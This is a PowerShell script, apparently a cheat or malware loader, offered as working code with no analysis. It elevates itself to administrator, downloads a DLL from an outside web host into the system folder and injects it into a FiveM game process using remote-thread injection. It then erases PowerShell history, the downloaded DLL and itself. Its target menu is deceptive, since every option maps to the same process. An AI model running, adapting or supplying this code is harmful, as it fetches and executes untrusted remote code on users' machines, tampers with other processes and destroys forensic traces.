# === Self-Elevate ===
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        Start-Process powershell.exe -Verb RunAs -ArgumentList (
            "-NoProfile",
            "-ExecutionPolicy Bypass",
            "-File `"$PSCommandPath`""
        )
        exit
    }
    catch {
        Write-Host "Failed to request Admin privileges: $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
}

# === Fixed LookupFunc ===
function LookupFunc {
    Param ($moduleName, $functionName)
    
    $signature = @'
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
'@
    
    $kernel32 = Add-Type -MemberDefinition $signature -Name 'Kernel32' -Namespace 'Win32' -PassThru
    
    $hModule = $kernel32::GetModuleHandle($moduleName)
    return $kernel32::GetProcAddress($hModule, $functionName)
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    ).DefineDynamicModule('InMemoryModule', $false).DefineType(
        'MyDelegateType',
        'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate]
    )
    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $delType,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# === Download DLL ===
$dllFileName = "Security.dll"
$dllPath = Join-Path ([Environment]::GetFolderPath("System")) $dllFileName
$dllUrl = "https://demoxservices.com/uploads/1774488808_d3d10.dll"

try {
    (New-Object System.Net.WebClient).DownloadFile($dllUrl, $dllPath) | Out-Null
}
catch {
    $dllPath = Join-Path $env:TEMP $dllFileName
    (New-Object System.Net.WebClient).DownloadFile($dllUrl, $dllPath) | Out-Null
}

# === Target Process Selection ===
Write-Host ""
Write-Host "Select target process:" -ForegroundColor Yellow
Write-Host "1. Notepad22" -ForegroundColor Cyan
Write-Host "2. Task Manager22 (Taskmgr)" -ForegroundColor Cyan
Write-Host "3. Explorer22" -ForegroundColor Cyan
$choice = Read-Host "Enter choice (1-3)"

$processName = ""
$processPath = ""

switch ($choice) {
    "1" { $processName = "FiveM_GTAProcess"; $processPath = "" }
    "2" { $processName = "FiveM_GTAProcess"; $processPath = "" }
    default { $processName = "FiveM_GTAProcess"; $processPath = "" }
}

$proc = Get-Process -Name $processName -ErrorAction SilentlyContinue
if (-not $proc) {
    Write-Host "[+] Starting $processName..." -ForegroundColor Yellow
    if ($processPath -ne "") {
        Start-Process $processPath
        Start-Sleep -Seconds 2
        $proc = Get-Process -Name $processName -ErrorAction SilentlyContinue
        if (-not $proc) {
            Write-Host "[!] Failed to start $processName" -ForegroundColor Red
            exit
        }
    }
}

$injProc = $proc | Select-Object -First 1 -ExpandProperty Id
$pid1 = [int]$injProc
Write-Host "[+] Target: $processName (PID: $pid1)" -ForegroundColor Green

# === Injection ===
try {
    $OpenProcessDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc "kernel32.dll" "OpenProcess"),
        (getDelegateType @([UInt32], [UInt32], [Int]) ([IntPtr]))
    )
    
    $VirtualAllocExDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc "kernel32.dll" "VirtualAllocEx"),
        (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
    )
    
    $WriteProcessMemoryDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc "kernel32.dll" "WriteProcessMemory"),
        (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool]))
    )
    
    $LoadLibraryADelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc "kernel32.dll" "LoadLibraryA"),
        (getDelegateType @([String]) ([IntPtr]))
    )
    
    $CreateRemoteThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc "kernel32.dll" "CreateRemoteThread"),
        (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
    )
    
    $hProcess = $OpenProcessDelegate.Invoke(0x001F0FFF, 0, $pid1)
    Write-Host "[+] Process Handle: $hProcess" -ForegroundColor Green
    
    $addr = $VirtualAllocExDelegate.Invoke($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
    Write-Host "[+] Allocated Memory: $addr" -ForegroundColor Green
    
    [Byte[]]$dllNameBytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath + "`0")
    [IntPtr]$outSize = [IntPtr]::Zero
    $res = $WriteProcessMemoryDelegate.Invoke($hProcess, $addr, $dllNameBytes, $dllNameBytes.Length, $outSize)
    Write-Host "[+] Memory Written: $res" -ForegroundColor Green
    
    $loadLibAddr = LookupFunc "kernel32.dll" "LoadLibraryA"
    Write-Host "[+] LoadLibraryA Address: $loadLibAddr" -ForegroundColor Green
    
    $hThread = $CreateRemoteThreadDelegate.Invoke($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $addr, 0, [IntPtr]::Zero)
    
    if ($hThread -ne [IntPtr]::Zero) {
        Write-Host "[✓] Injection successful (Thread Handle: $hThread)" -ForegroundColor Green
    } else {
        Write-Host "[!] Injection failed" -ForegroundColor Red
    }
}
catch {
    Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host $_.ScriptStackTrace -ForegroundColor Yellow
}

# === Cleanup ===
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
$histPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $histPath) { Remove-Item $histPath -Force -ErrorAction SilentlyContinue }
if (Test-Path $dllPath) { Remove-Item $dllPath -Force -ErrorAction SilentlyContinue }
if ($PSCommandPath -and (Test-Path $PSCommandPath)) { Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue }
[GC]::Collect()
Read-Host -Prompt "Press Enter to continue..."
exit
